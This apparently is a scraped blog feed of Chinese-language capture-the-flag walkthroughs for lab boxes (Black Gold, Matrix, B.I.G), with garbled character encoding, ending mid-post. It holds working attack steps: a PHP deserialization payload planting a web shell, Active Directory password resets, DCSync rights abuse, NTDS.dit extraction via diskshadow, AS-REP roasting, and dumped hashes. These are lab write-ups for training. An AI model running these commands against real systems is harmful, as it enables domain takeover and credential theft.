dc01.neptune.thl\rINFO: Found 1 domains\rINFO: Found 1 domains in the forest\rINFO: Found 1 computers\rINFO: Connecting to LDAP server: dc01.neptune.thl\rINFO: Found 8 users\rINFO: Found 53 groups\rINFO: Found 2 gpos\rINFO: Found 1 ous\rINFO: Found 19 containers\rINFO: Found 0 trusts\rINFO: Starting computer enumeration with 10 workers\rINFO: Querying computer: DC01.neptune.thl\rINFO: Done in 00M 00S\rINFO: Compressing output into 20250408161249_bloodhound.zip Own Emma #\ræ³¨æ„åˆ°Victoræ˜¯ITç»„çš„\nè¿æ¥åˆ°smbï¼Œè·å–åˆ°äº†ä¸€ä¸ªè„šæœ¬\n$sourceDirectory = \u0026#34;C:\\Confidenciales\u0026#34;\r$destinationDirectory = \u0026#34;E:\\Backups\\Confidenciales\u0026#34;\r$username = \u0026#34;emma.johnson\u0026#34;\r$password = ConvertTo-SecureString \u0026#34;sb9TVndq8N@tUVMmP2@#\u0026#34; -AsPlainText -Force\r$credentials = New-Object System.Management.Automation.PSCredential($username, $password)\r$emailFrom = \u0026#34;emma.johnson@neptune.thl\u0026#34;\r$emailTo = \u0026#34;emma.johnson@neptune.thl\u0026#34;\r$smtpServer = \u0026#34;smtp.neptune.thl\u0026#34;\r$smtpPort = 587\r$emailSubject = \u0026#34;NotificaciÃ³n de Backup Completo\u0026#34;\r$dateStamp = Get-Date -Format \u0026#34;yyyyMMdd_HHmmss\u0026#34;\r$backupFileName = \u0026#34;report_backup_$dateStamp.zip\u0026#34;\r$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName\rfunction Send-EmailNotification {\rparam (\r[string]$subject,\r[string]$body\r)\rtry {\r$smtpClient = New-Object System.Net.Mail.SmtpClient($smtpServer, $smtpPort)\r$smtpClient.EnableSsl = $true\r$smtpClient.Credentials = New-Object System.Net.NetworkCredential(\u0026#34;smtp_user\u0026#34;, \u0026#34;smtp_password\u0026#34;)\r$mailMessage = New-Object System.Net.Mail.MailMessage($emailFrom, $emailTo, $subject, $body)\r$smtpClient.Send($mailMessage)\rWrite-Host \u0026#34;Correo enviado a $emailTo\u0026#34;\r}\rcatch {\rWrite-Host \u0026#34;Error al enviar el correo: $_\u0026#34;\r}\r}\rtry {\rWrite-Host \u0026#34;Iniciando el backup...\u0026#34;\rCompress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath\rWrite-Host \u0026#34;Backup completado exitosamente. Archivo guardado en: $backupFilePath\u0026#34;\r$emailBody = \u0026#34;El proceso de backup se ha completado correctamente.\u0026#34; + \u0026#34;`n\u0026#34; + \u0026#34;Archivo de backup: $backupFilePath\u0026#34;\rSend-EmailNotification -subject $emailSubject -body $emailBody\r}\rcatch {\rWrite-Host \u0026#34;Error al realizar el backup: $_\u0026#34;\r$errorSubject = \u0026#34;Error en el proceso de Backup\u0026#34;\r$errorBody = \u0026#34;Hubo un problema al realizar el backup.\u0026#34; + \u0026#34;`n\u0026#34; + \u0026#34;Error: $_\u0026#34;\rSend-EmailNotification -subject $errorSubject -body $errorBody\r}# å¾—åˆ°äº†emma.johnsonçš„å¯†ç ï¼Œå¯ä»¥ç›´æ¥ç™»å½•\nè¿™é‡Œéœ€è¦é‡æ–°å¯¼å…¥ä¸€ä¸‹é¶æœºï¼Œæ‰èƒ½çœ‹åˆ°åˆ©ç”¨æƒé™\nOwn Thomas #\ræ”¹ä¸€ä¸‹ä»–çš„å¯†ç \n[root@kali] /home/kali/BlackGOld â¯ bloodyAD --host \u0026#34;192.168.56.10\u0026#34; -d \u0026#34;neptune.thl\u0026#34; -u \u0026#39;emma.johnson\u0026#39; -p \u0026#39;sb9TVndq8N@tUVMmP2@#\u0026#39; set password \u0026#39;THOMAS.BROWN\u0026#39; \u0026#39;Hello123!\u0026#39; â\r[+] Password changed successfully! æŸ¥çœ‹ä¸€ä¸‹æƒé™ï¼Œç»å…¸çš„SeBackupPrivilege\nDiskshadow #\rä¸‹é¢çš„æ–¹æ³•åŒHTB-Blackfield - HYH\necho \u0026#34;set context persistent nowriters\u0026#34; | out-file ./diskshadow.txt -encoding ascii\recho \u0026#34;add volume c: alias temp\u0026#34; | out-file ./diskshadow.txt -encoding ascii -append\recho \u0026#34;create\u0026#34; | out-file ./diskshadow.txt -encoding ascii -append echo \u0026#34;expose %temp% z:\u0026#34; | out-file ./diskshadow.txt -encoding ascii -append\rdiskshadow.exe /s c:\\temp\\diskshadow.txt ç„¶åå¤‡ä»½ntdsï¼Œä¸‹è½½\nrobocopy /b Z:\\Windows\\NTDS C:\\temp NTDS.dit\rdownload C:\\temp\\NTDS.dit è§£å¯†å¾—åˆ°hash\n[root@kali] /home/kali/\râ¯ impacket-secretsdump -system system.bak -ntds ntds.dit LOCAL æœ€åæˆåŠŸææƒ\nSummary #\rUserï¼špdféå†æ³„éœ²å¯†ç ï¼Œrpcç”¨æˆ·ä¿¡æ¯æ³„éœ²ï¼Œæœ€åé€šè¿‡smbæ‹¿åˆ°emmaç”¨æˆ·ã€‚\nRootï¼šç»å…¸çš„backup operatorç»„ææƒã€‚\nä¸‹é¢è¡¥å……ä¸€ä¸ªçŸ¥è¯†ç‚¹\nSAM æ–‡ä»¶åªåŒ…å«æœ¬åœ°è´¦æˆ·çš„ Hashï¼Œé€‚ç”¨äºéåŸŸæ§ï¼ˆæ¯”å¦‚æ™®é€š Windows æœºå™¨ï¼‰ã€‚\nNTDS.dit æ˜¯åŸŸæ§æ•°æ®åº“ï¼ŒåŒ…å« æ‰€æœ‰åŸŸç”¨æˆ· çš„å¯†ç  Hashï¼ˆæ›´å…³é”®ã€æ›´æœ‰ç”¨ï¼‰ã€‚\nSYSTEM æ–‡ä»¶åŒ…å«åŠ å¯†å¯†é’¥ï¼Œæ— å®ƒæ— æ³•è§£å¯† Hashã€‚\n","date":"2025-04-08","externalUrl":null,"permalink":"/posts/2025/04/thehackerslabs-black-gold/","section":"Posts","summary":"","title":"Thehackerslabs-Black Gold","type":"posts"},{"content":"","date":"2025-04-08","externalUrl":null,"permalink":"/tags/vulnyx/","section":"Tags","summary":"","title":"Vulnyx","type":"tags"},{"content":"","date":"2025-04-08","externalUrl":null,"permalink":"/categories/vulnyx/","section":"Categories","summary":"","title":"Vulnyx","type":"categories"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali/Matrix â¯ nmap 192.168.56.141 -sV -A -p-\r22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)\r| ssh-hostkey: | 256 67:78:c9:d2:e3:ff:be:fc:9e:13:9a:af:9d:59:17:66 (ECDSA)\r|_ 256 1a:78:b1:e6:f1:f0:d1:b3:ab:c8:3f:95:fd:46:52:67 (ED25519)\r80/tcp open http Apache httpd 2.4.62 ((Debian))\r|_http-server-header: Apache/2.4.62 (Debian)\r|_http-title: Enter The Matrix Gobuster #\r[root@kali] /home/kali/Matrix â¯ gobuster dir -u http://192.168.56.141/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x .pcap ===============================================================\rGobuster v3.6\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://192.168.56.141/\r[+] Method: GET\r[+] Threads: 10\r[+] Wordlist: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt\r[+] Negative Status codes: 404\r[+] User Agent: gobuster/3.6\r[+] Extensions: pcap\r[+] Timeout: 10s\r===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/trinity.pcap (Status: 200) [Size: 146389]\r/server-status (Status: 403) [Size: 279]\rProgress: 441120 / 441122 (100.00%)\r===============================================================\rFinished\r=============================================================== Exiftool #\rè¿›è¡Œæµé‡åˆ†æ\nå‘ç°ä¸€ä¸ªå›¾ç‰‡ï¼Œå°†å…¶å¯¼å‡º\n[root@kali] /home/kali/Matrix â¯ exiftool object172.image%2fwebp ExifTool Version Number : 13.00\rFile Name : object172.image%2fwebp\rDirectory : .\rFile Size : 119 kB\rFile Modification Date/Time : 2025:04:08 20:23:11+08:00\rFile Access Date/Time : 2025:04:08 20:23:19+08:00\rFile Inode Change Date/Time : 2025:04:08 20:23:11+08:00\rFile Permissions : -rw-r--r--\rFile Type : Extended WEBP\rFile Type Extension : webp\rMIME Type : image/webp\rWebP Flags : XMP, ICC Profile\rImage Width : 800\rImage Height : 800\rProfile CMM Type : Little CMS\rProfile Version : 4.4.0\rProfile Class : Display Device Profile\rColor Space Data : RGB\rProfile Connection Space : XYZ\rProfile Date Time : 2025:01:26 01:39:22\rProfile File Signature : acsp\rPrimary Platform : Apple Computer Inc.\rCMM Flags : Not Embedded, Independent\rDevice Manufacturer : Device Model : Device Attributes : Reflective, Glossy, Positive, Color\rRendering Intent : Perceptual\rConnection Space Illuminant : 0.9642 1 0.82491\rProfile Creator : Little CMS\rProfile ID : 0\rProfile Description : GIMP built-in sRGB\rProfile Copyright : Public Domain\rMedia White Point : 0.9642 1 0.82491\rChromatic Adaptation : 1.04788 0.02292 -0.05022 0.02959 0.99048 -0.01707 -0.00925 0.01508 0.75168\rRed Matrix Column : 0.43604 0.22249 0.01392\rBlue Matrix Column : 0.14305 0.06061 0.71393\rGreen Matrix Column : 0.38512 0.7169 0.09706\rRed Tone Reproduction Curve : (Binary data 32 bytes, use -b option to extract)\rGreen Tone Reproduction Curve : (Binary data 32 bytes, use -b option to extract)\rBlue Tone Reproduction Curve : (Binary data 32 bytes, use -b option to extract)\rChromaticity Channels : 3\rChromaticity Colorant : Unknown\rChromaticity Channel 1 : 0.64 0.33002\rChromaticity Channel 2 : 0.3 0.60001\rChromaticity Channel 3 : 0.15001 0.06\rDevice Mfg Desc : GIMP\rDevice Model Desc : sRGB\rVP8 Version : 0 (bicubic reconstruction, normal loop)\rHorizontal Scale : 0\rVertical Scale : 0\rXMP Toolkit : Image::ExifTool 12.57\rDescription : Morpheus, we have found a direct connection to the \u0026#39;Mind\u0026#39;, the artificial intelligence that controls the Matrix. You can find it at the domain M47r1X.matrix.nyx.\rImage Size : 800x800\rMegapixels : 0.640 å¾—åˆ°ä¸€ä¸ªåŸŸåM47r1X.matrix.nyx\nOwn www-data #\rè¿›å…¥åä¼¼ä¹æ˜¯ä¸€ä¸ªäº¤æµæ¡†\nè®¿é—®é‚£ä¸ªtxtï¼Œå¾—åˆ°ä¸€æ®µphpä»£ç \n\u0026lt;?php\rclass Message\r{\rpublic $file = \u0026#34;messages.txt\u0026#34;;\rpublic $message = \u0026#34;\u0026#34;;\rpublic function __unserialize(array $data): void\r{\r$file = $data[\u0026#39;file\u0026#39;] ?? $this-\u0026gt;file;\r$this-\u0026gt;message = $data[\u0026#39;message\u0026#39;];\rfile_put_contents($file, $data[\u0026#39;message\u0026#39;] . \u0026#34;\\n\u0026#34;, FILE_APPEND);\r}\r}\rå¯¹äº¤æµæ¡†è¿›è¡ŒæŠ“åŒ…å¯ä»¥çœ‹åˆ°æ˜¯å­˜åœ¨ååºåˆ—åŒ–çš„\næ ¹æ®é€»è¾‘ä¿®æ”¹ä¸€ä¸‹\n\u0026lt;?php\rclass Message\r{\rpublic $file = \u0026#34;hack.php\u0026#34;;\rpublic $message = \u0026#39;\u0026lt;?php system($_GET[\u0026#34;cmd\u0026#34;]);\u0026#39;;\r}\r$obj = new Message();\r$payload = serialize($obj);\recho $payload;\r#O:7:\u0026#34;Message\u0026#34;:2:{s:4:\u0026#34;file\u0026#34;;s:8:\u0026#34;hack.php\u0026#34;;s:7:\u0026#34;message\u0026#34;;s:27:\u0026#34;\u0026lt;?php system($_GET[\u0026#34;cmd\u0026#34;]);\u0026#34;;} Own smith #\rä¹‹å‰åœ¨æµé‡é‡Œå‘ç°äº†å¯†ç å­—ç¬¦ä¸²\nå¯ä»¥åˆ‡æ¢ç”¨æˆ·\nRoot #\ræŸ¥çœ‹sudo -l\nsmith@matrix:~$ sudo -l\r[sudo] contraseÃ±a para smith: Lo siento, pruebe otra vez.\r[sudo] contraseÃ±a para smith: Matching Defaults entries for smith on matrix:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\rUser smith may run the following commands on matrix:\r(ALL) PASSWD: /usr/bin/rsync rsync | GTFOBins Summary #\rUserï¼šæµé‡åˆ†æï¼Œé€šè¿‡å›¾ç‰‡æ‹¿åˆ°å­åŸŸåï¼Œç„¶åPHPååºåˆ—åŒ–å†™å…¥æœ¨é©¬ã€‚\nRootï¼šæŸ¥æ‰¾GTFObinsï¼Œç›´æ¥ææƒã€‚\n","date":"2025-04-08","externalUrl":null,"permalink":"/posts/2025/04/vulnyx-matrix/","section":"Posts","summary":"","title":"VulNyx-Matrix","type":"posts"},{"content":"","date":"2025-04-08","externalUrl":null,"permalink":"/tags/windows/","section":"Tags","summary":"","title":"Windows","type":"tags"},{"content":"\rBox Info #\rOS Windows Difficulty Hard Nmap #\r[root@kali] /home/kali â¯ nmap 192.168.212.4 -sV -A -p-\rPORT STATE SERVICE VERSION\r53/tcp open domain Simple DNS Plus\r80/tcp open http Microsoft IIS httpd 10.0\r| http-methods: |_ Potentially risky methods: TRACE\r|_http-title: Site doesn\u0026#39;t have a title (text/html).\r|_http-server-header: Microsoft-IIS/10.0\r88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-04-05 23:20:54Z)\r135/tcp open msrpc Microsoft Windows RPC\r139/tcp open netbios-ssn Microsoft Windows netbios-ssn\r389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: bbr.thl, Site: Default-First-Site-Name)\r445/tcp open microsoft-ds?\r464/tcp open kpasswd5?\r593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0\r636/tcp open tcpwrapped\r3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: bbr.thl, Site: Default-First-Site-Name)\r3269/tcp open tcpwrapped\r5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\r|_http-title: Not Found\r|_http-server-header: Microsoft-HTTPAPI/2.0\r9389/tcp open mc-nmf .NET Message Framing\r47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\r|_http-title: Not Found\r|_http-server-header: Microsoft-HTTPAPI/2.0\r49664/tcp open msrpc Microsoft Windows RPC\r49665/tcp open msrpc Microsoft Windows RPC\r49666/tcp open msrpc Microsoft Windows RPC\r49667/tcp open msrpc Microsoft Windows RPC\r49669/tcp open msrpc Microsoft Windows RPC\r49670/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0\r49671/tcp open msrpc Microsoft Windows RPC\r49673/tcp open msrpc Microsoft Windows RPC\r49676/tcp open msrpc Microsoft Windows RPC\r49686/tcp open msrpc Microsoft Windows RPC\r57043/tcp open msrpc Microsoft Windows RPC\rMAC Address: 08:00:27:29:23:16 (Oracle VirtualBox virtual NIC)\rDevice type: general purpose\rRunning: Microsoft Windows 2016\rOS CPE: cpe:/o:microsoft:windows_server_2016\rOS details: Microsoft Windows Server 2016 build 10586 - 14393\rNetwork Distance: 1 hop\rService Info: Host: BIG; OS: Windows; CPE: cpe:/o:microsoft:windows\rHost script results:\r|_clock-skew: 15h54m38s\r| smb2-security-mode: | 3:1:1: |_ Message signing enabled and required\r|_nbstat: NetBIOS name: BIG, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 08:00:27:29:23:16 (Oracle VirtualBox virtual NIC)\r| smb2-time: | date: 2025-04-05T23:21:49\r|_ start_date: 2025-04-05T19:55:29 å°†bbr.thlæ·»åŠ åˆ°**/etc/hosts**\nGobuster #\r[root@kali] /home/kali â¯ gobuster dir -u http://192.168.212.4/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt ===============================================================\rGobuster v3.6\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://192.168.212.4/\r[+] Method: GET\r[+] Threads: 10\r[+] Wordlist: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt\r[+] Negative Status codes: 404\r[+] User Agent: gobuster/3.6\r[+] Timeout: 10s\r===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/images (Status: 301) [Size: 151] [--\u0026gt; http://192.168.212.4/images/]\r/Images (Status: 301) [Size: 151] [--\u0026gt; http://192.168.212.4/Images/]\r/contents (Status: 301) [Size: 153] [--\u0026gt; http://192.168.212.4/contents/]\r/IMAGES (Status: 301) [Size: 151] [--\u0026gt; http://192.168.212.4/IMAGES/]\r/songs (Status: 301) [Size: 150] [--\u0026gt; http://192.168.212.4/songs/]\r/Contents (Status: 301) [Size: 153] [--\u0026gt; http://192.168.212.4/Contents/]\r/Songs (Status: 301) [Size: 150] [--\u0026gt; http://192.168.212.4/Songs/]\rProgress: 220560 / 220561 (100.00%)\r===============================================================\rFinished\r=============================================================== StegHide #\r/Contents/notify.txtçš„å†…å®¹å¦‚ä¸‹\nWho the hell did you hire to create the website!\rHiding keys in MD5 again!\rI\u0026#39;m going to fire that guy\rmusic /Songs/Skyisthelimit.txtæ˜¯ä¸€ä¸ªå¯†ç åˆ—è¡¨\nç„¶å**/Images/big2.jpg**è¿™ä¸ªå›¾ç‰‡å¯ä»¥è¿›è¡Œåˆ†ç¦»\nè¿™é‡Œç›´æ¥æŸ¥çœ‹WPå§ï¼Œå‘ç°å¯†ç ä¸åœ¨å¯†ç åˆ—è¡¨é‡Œï¼Œè€Œæ˜¯åœ¨ä¸»é¡µçš„ä¸€æ®µæ–‡å­—\n\u0026lt;!DOCTYPE html\u0026gt;\r\u0026lt;html\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;style\u0026gt;\r/* It was all a dream */\rbody {\rbackground-image: url(\u0026#39;big1.jpg\u0026#39;); background-size: cover; background-repeat: no-repeat; background-attachment: fixed;\rbackground-position: center; }\r\u0026lt;/style\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;h1\u0026gt;Music\u0026lt;/h1\u0026gt;\r\u0026lt;p\u0026gt;I keep it music music, I eat that lunch (Yeah)\u0026lt;/p\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt; å°†å…¶è½¬ä¸ºMD5\n[root@kali] /home/kali/BIG â¯ echo -n \u0026#34;It was all a dream\u0026#34;| md5sum 99ae77c0c0faf78b872f9f452e3eaa24 - åˆ†ç¦»å›¾ç‰‡\n[root@kali] /home/kali/BIG â¯ steghide extract -sf big2.jpg â\rEnter passphrase: wrote extracted data to \u0026#34;frase.txt\u0026#34;.\r[root@kali] /home/kali/BIG â¯ ls\rbig2.jpg frase.txt [root@kali] /home/kali/BIG â¯ cat frase.txt Bigpoppa1972 å°è¯•ç™»å½•\nCrackmapexec #\rè¿›è¡Œç”¨æˆ·æšä¸¾\n[root@kali] /home/kali/BIG â¯ crackmapexec smb bbr.thl -u music -p Bigpoppa1972 --rid-brute | grep \u0026#34;SidTypeUser\u0026#34;\rSMB bbr.thl 445 BIG 500: bbr\\Administrator (SidTypeUser)\rSMB bbr.thl 445 BIG 501: bbr\\Guest (SidTypeUser)\rSMB bbr.thl 445 BIG 502: bbr\\krbtgt (SidTypeUser)\rSMB bbr.thl 445 BIG 503: bbr\\DefaultAccount (SidTypeUser)\rSMB bbr.thl 445 BIG 1000: bbr\\BIG$ (SidTypeUser)\rSMB bbr.thl 445 BIG 1103: bbr\\Music (SidTypeUser)\rSMB bbr.thl 445 BIG 1104: bbr\\song (SidTypeUser) Bloodhound #\r[root@kali] /home/kali/BIG â¯ bloodhound-python -u \u0026#39;music\u0026#39; -p \u0026#39;Bigpoppa1972\u0026#39; -d bbr.thl -ns 192.168.212.4 -c all --zip\rINFO: Found AD domain: bbr.thl\rINFO: Getting TGT for user\rWARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (BIG.bbr.thl:88)] [Errno -2] Name or service not known\rINFO: Connecting to LDAP server: BIG.bbr.thl\rINFO: Found 1 domains\rINFO: Found 1 domains in the forest\rINFO: Found 1 computers\rINFO: Connecting to LDAP server: BIG.bbr.thl\rINFO: Found 7 users\rINFO: Found 57 groups\rINFO: Found 2 gpos\rINFO: Found 1 ous\rINFO: Found 19 containers\rINFO: Found 0 trusts\rINFO: Starting computer enumeration with 10 workers\rINFO: Querying computer: BIG.bbr.thl\rINFO: Done in 00M 00S\rINFO: Compressing output into 20250406075042_bloodhound.zip GetNPUsers #\rç­›æŸ¥æ²¡æœ‰è®¾ç½®é¢„è®¤è¯çš„ç”¨æˆ·ï¼Œæ˜¯SONGç”¨æˆ·\n[root@kali] /home/kali/BIG â¯ impacket-GetNPUsers -usersfile username.txt -no-pass -dc-ip \u0026#34;192.168.212.4\u0026#34; bbr.thl/ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies /usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).\rnow = datetime.datetime.utcnow() + datetime.timedelta(days=1)\r$krb5asrep$23$song@BBR.THL:dac6809472a8f34ab3472d707cf28027$16400eda9e9d0ee4f860756727117bdb392e3fc599580f96a3dc387ded4f8b69ca509a054b470c9bce363f5fc189220b03df56c2ee1605708c4d2cbd337ba583f3b95bfe84879dcc626a2cd642472bf5dc2f109527e122c08ae250f9ef788d50bcf0e6242ec4c1145bedddf4ac5f95bd422e553ac9cc4bedb62835fb7580b82c2bc4c5449d2027513efbcfe08fc4c7cc18195f966e9e8627193db30b611021994e6c0cc8aca25a78fcdffdaf30791db06c87c21dee1692c405aefb2214fd40100b37d74f012e6b62fa981a4331e65a82194a264991e0656dd6d66f697505865006fc è¿™é‡Œçš„å­—å…¸è¦ä½¿ç”¨ç½‘ç«™æä¾›çš„\n[root@kali] /home/kali/BIG â¯ john hash.txt --wordlist=password Using default input encoding: UTF-8\rLoaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])\rWill run 4 OpenMP threads\rPress \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status\rPasswordsave@ ($krb5asrep$23$song@BBR.THL) 1g 0:00:00:00 DONE (2025-04-06 07:57) 100.0g/s 20100p/s 20100c/s 20100C/s 123456..qwerty123456\rUse the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably\rSession completed. é€šè¿‡winrmç™»å½•songç”¨æˆ·\n[root@kali] /home/kali/BIG â¯ evil-winrm -i bbr.thl -u song -p \u0026#39;Passwordsave@\u0026#39; SeBackupPrivilege #\ræŸ¥çœ‹ä¸€ä¸‹æƒé™ï¼Œå‚è€ƒHTB-Cicada - HYH\n*Evil-WinRM* PS C:\\Users\u0026gt; whoami /priv\rPRIVILEGES INFORMATION\r----------------------\rPrivilege Name Description State\r============================= =================================== =======\rSeMachineAccountPrivilege Add workstations to domain Enabled\rSeSystemtimePrivilege Change the system time Enabled\rSeBackupPrivilege Back up files and directories Enabled\rSeRestorePrivilege Restore files and directories Enabled\rSeShutdownPrivilege Shut down the system Enabled\rSeChangeNotifyPrivilege Bypass traverse checking Enabled\rSeRemoteShutdownPrivilege Force shutdown from a remote system Enabled\rSeIncreaseWorkingSetPrivilege Increase a process working set Enabled\rSeTimeZonePrivilege Change the time zone Enabled [root@kali] /home/kali/BIG â¯ impacket-secretsdump -sam SAM -system SYSTEM LOCAL\rImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Target system bootKey: 0xbb33617256ea48219d9d3d01766b7a9e\r[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\rAdministrator:500:aad3b435b51404eeaad3b435b51404ee:bb1c50a48c37e053d2045cd5b55cd2f2:::\rGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\rDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\r[*] Cleaning up... è¿™ä¸ªä¸èƒ½ç›´æ¥ç”¨äºç™»å½•\nDCsync #\rDCSync | The Hacker Recipes å†æ¬¡è¿›è¡Œåˆ†æï¼Œå‘ç°å¯ä»¥ä¿®æ”¹åˆ°åŸŸæ§çš„ACL\né¦–å…ˆå°†songæ·»åŠ åˆ°SPECIAL PERMISSIONSç»„\n[root@kali] /home/kali/BIG â¯ bloodyAD --host \u0026#34;192.168.212.4\u0026#34; -d \u0026#34;bbr.thl\u0026#34; -u \u0026#34;song\u0026#34; -p \u0026#34;Passwordsave@\u0026#34; add groupMember \u0026#39;SPECIAL PERMISSIONS\u0026#39; song â\r[+] song added to SPECIAL PERMISSIONS æ·»åŠ ä¸€ä¸ªDCsyncçš„æƒé™\n[root@kali] /home/kali/BIG â¯ bloodyAD --host \u0026#34;192.168.212.4\u0026#34; -d \u0026#34;bbr.thl\u0026#34; -u \u0026#34;song\u0026#34; -p \u0026#34;Passwordsave@\u0026#34; add dcsync song â\r[+] song is now able to DCSync å†æ¬¡è¯»å–hash\n[root@kali] /home/kali/BIG â¯ impacket-secretsdump \u0026#34;bbr.thl/song:Passwordsave@\u0026#34;@192.168.212.4 â\rImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\r[*] Using the DRSUAPI method to get NTDS.DIT secrets\rAdministrator:500:aad3b435b51404eeaad3b435b51404ee:5d48bcf84aea999fb1ade06970a81237:::\rGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\rkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:a0b3723455bd8be604ae2e1df74db81b:::\rDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\rbbr.thl\\Music:1103:aad3b435b51404eeaad3b435b51404ee:8ab1d3828490421d0dc1ddd6e2552d90:::\rbbr.thl\\song:1104:aad3b435b51404eeaad3b435b51404ee:5919764374e465e68f886ac0c4f75ab3:::\rBIG$:1000:aad3b435b51404eeaad3b435b51404ee:7811e608bfec3a56f807ddd9dfdb21f9:::\r[*] Kerberos keys grabbed\rAdministrator:aes256-cts-hmac-sha1-96:e3f894ddb7f81e6b2cf2f0c59fc80e6754c65dd3b92bb2d0d3e8d633a7fbfbdf\rAdministrator:aes128-cts-hmac-sha1-96:b095f30c1921e1d730b28984573c761c\rAdministrator:des-cbc-md5:c8839bce494537d0\rkrbtgt:aes256-cts-hmac-sha1-96:f380684e6a965bbc18ee8727d8326c00b75a13069df78ca8718db459542b975c\rkrbtgt:aes128-cts-hmac-sha1-96:946eece70daaa80ce8ad63bfc3972467\rkrbtgt:des-cbc-md5:c8d020da3b51a8bf\rbbr.thl\\Music:aes256-cts-hmac-sha1-96:d5fd1078b0b49b57a20512e8709792103766121e43115456191cc23a083af099\rbbr.thl\\Music:aes128-cts-hmac-sha1-96:27c2250ad5385ae08ce98af7894a2a9a\rbbr.thl\\Music:des-cbc-md5:d3bfabf49eef37d6\rbbr.thl\\song:aes256-cts-hmac-sha1-96:ae6f0ada27e369f5bf95309eb44dcad3bd26a8fc6017f0a0344f814ff36ae26e\rbbr.thl\\song:aes128-cts-hmac-sha1-96:e3ac1564472d51084bd95307279ac988\rbbr.thl\\song:des-cbc-md5:ef52f8df7a9dfeef\rBIG$:aes256-cts-hmac-sha1-96:b288ac848e2ba1b1e068cff6bdb950fb5ef336e4f44717aabd3b9a02eb21901d\rBIG$:aes128-cts-hmac-sha1-96:99b71046382eea69198aa3b44db56837\rBIG$:des-cbc-md5:c7fb8c25297f945d\r[*] Cleaning up... è¿™æ¬¡å°±ç™»å½•ä¸Šäº†\nSummary #\rUserï¼šæ ¹æ®ç½‘é¡µæç¤ºï¼Œæå–å›¾ç‰‡å¾—åˆ°musicå¯†ç ï¼Œè¿›è¡ŒåŸŸå†…åˆ†æï¼Œå‘ç°å­˜åœ¨Kerberosæœªå¼€å¯é¢„è®¤è¯çš„ç”¨æˆ·ï¼Œå¾—åˆ°songç”¨æˆ·ã€‚\nAdministratorï¼šæ ¹æ®Songç”¨æˆ·çš„æƒé™ï¼Œè¿›è¡ŒDCsyncæ”»å‡»ã€‚\n","date":"2025-04-05","externalUrl":null,"permalink":"/posts/2025/04/thehackerslabs-b-i-g/","section":"Posts","summary":"","title":"Thehackerslabs-B.I.G","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Nmap #\r[root@kali] /home/kali/Todd â¯ nmap 192.168.56.137 -sV -A -p-\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\r| ssh-hostkey: | 2048 93:a4:92:55:72:2b:9b:4a:52:66:5c:af:a9:83:3c:fd (RSA)\r| 256 1e:a7:44:0b:2c:1b:0d:77:83:df:1d:9f:0e:30:08:4d (ECDSA)\r|_ 256 d0:fa:9d:76:77:42:6f:91:d3:bd:b5:44:72:a7:c9:71 (ED25519)\r80/tcp open http Apache httpd 2.4.59 ((Debian))\r|_http-title: Mindful Listening\r|_http-server-header: Apache/2.4.59 (Debian) é¡µé¢æ²¡æœ‰ä»»ä½•å¯ä»¥ç”¨çš„ä¿¡æ¯\nç„¶åå†æ¬¡è¿›è¡ŒNmapï¼Œå‘ç°å¤šäº†å‡ ä¸ªç«¯å£\n[root@kali] /home/kali/Todd â¯ nmap 192.168.56.137 -sV -A -p-\rStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-02 15:52 CST\rNmap scan report for 